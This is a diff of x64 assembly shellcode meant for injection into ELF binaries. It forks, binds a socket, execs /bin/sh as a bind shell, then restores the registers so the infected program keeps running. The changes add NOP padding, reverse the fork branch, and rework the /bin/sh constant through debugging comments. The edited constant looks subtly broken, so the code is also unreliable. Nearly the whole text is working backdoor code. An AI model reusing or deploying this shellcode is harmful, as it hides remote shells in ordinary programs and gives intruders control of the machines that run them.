@@ -1,12 +1,17 @@
 ; Shellcode inpired fro https://www.matteomalvica.com/blog/2019/05/18/injecting-shellcode-into-x64-elf-binaries/
-BITS 64
+;BITS 64
 
-SECTION .text
-global main
+;SECTION .text
+;global main
 
-section .text
+;section .text
 
-main:
+  nop 
+  nop 
+  nop 
+  nop 
+  nop 
+  nop
   push rax         ; save all clobbered registers
   push rcx               
   push rdx
@@ -16,17 +21,14 @@ main:
 
   ;fork
   xor rax,rax
-  add rax,57
+  add rax,0x39
   syscall
   cmp eax, 0
-  jnz parent
+  jz normal_exec ; execute normal if child 
 ;On success, the PID of the child process is returned in the parent,
 ;and 0 is returned in the child.
 
-child:  
-  ;setsid
-  mov rax, 112
-  syscall
+rev_shell:  
   ; socket
   xor eax,eax
   xor ebx,ebx
@@ -40,7 +42,13 @@ child:
   mov al,0x29      ; sys_socket (syscall 41)
   syscall
 
+  ;setsid
+;  mov rax, 112
+;  syscall
+
+
   xchg ebx,eax
+
 
   ; bind
   xor  rax,rax
@@ -84,8 +92,81 @@ child:
 
   ;exec
   xor rdx,rdx
-  mov rbx,0x68732f6e69622fff ;echo -ne "\x68\x73\x2f\x6e\x69\x62\x2f"  hs/nib/ shift 1byte to generate 0byte /bin/sh\x00 little endian
-  shr rbx,0x8
+  nop 
+  nop 
+  nop 
+        ;'0x68732f7090622fff' VALUE TO SEND
+  ;mov r12,0x68732f70  ; e became d wtf, 
+;$r12   : 0x68732f6e90622fff GOT RESULT
+	 ;0x68732f6f69622fff VALUE NEEDED
+; 	  0x0000000127000000 diff=Result - Needed
+        ; 0x68732f0000622fff		Newinputt=Value+diff
+;b>>> hex(0x0000000127000000+0x68732f6f69622fff)
+;'0x68732f7090622fff' VALUE TO SEND
+	;'    0x1000 27000000' to substract
+  ;shl r12,32
+         ;'0x68732f7090622fff' VALUE TO SEND
+  ;add          r12,0x90622fff
+  nop 
+  nop 
+  nop 
+  nop 
+ mov rbx,0x68732f6f69622fff;echo -ne "\x68\x73\x2f\x6e\x69\x62\x2f"  hs/nib/ shift 1byte to generate 0byte /bin/sh\x00 little endian
+	 ;0x68732f6f69622fff VALUE NEEDED
+ 
+;
+  ;mov rbx,0x0
+  ;shl rbx,0x8
+ ;
+  ;mov rbx,0x68
+  ;shl rbx,0x8
+;
+  ;add rbx,0x73
+  ;shl rbx,0x8
+;
+  ;add rbx,0x2f
+  ;shl rbx,0x8
+;
+  ;add rbx,0x6e
+  ;shl rbx,0x8
+;
+  ;add rbx,0x69
+  ;shl rbx,0x8
+;
+  ;add rbx,0x62
+  ;shl rbx,0x8
+;
+  ;add rbx,0x2f
+  ;shl rbx,0x8
+;add rbx,  0x12
+;shl rbx, 8
+;add rbx,  0x7a
+;shl rbx, 8
+;add rbx,  0x61
+;shl rbx, 8
+;add rbx,  0x3d
+;shl rbx, 8
+;add rbx,  0x7c
+;shl rbx, 8
+;add rbx,  0x7b
+;shl rbx, 8
+;add rbx,  0x70
+;shl rbx, 8
+;add rbx,  0x3d
+;xor rbx,0x12
+;xor rbx,0x1200
+;xor rbx,0x120000
+;xor rbx,0x12000000
+;xor rbx,0x1200000000
+;xor rbx,0x120000000000
+;xor rbx,0x12000000000000
+;xor rbx,0x1200000000000000
+;
+;;0x68732f6f69622fff VALUE NEEDED
+  nop 
+  nop 
+  nop 
+  ;shr rbx,0x8
   push rbx
   mov rdi,rsp ; ;/bin/sh
   xor rax,rax
@@ -101,10 +182,11 @@ child:
 
 
 
-parent:
+normal_exec:
   pop r11          ; restore all registers
   pop rdi
   pop rsi
   pop rdx
   pop rcx
   pop rax
+
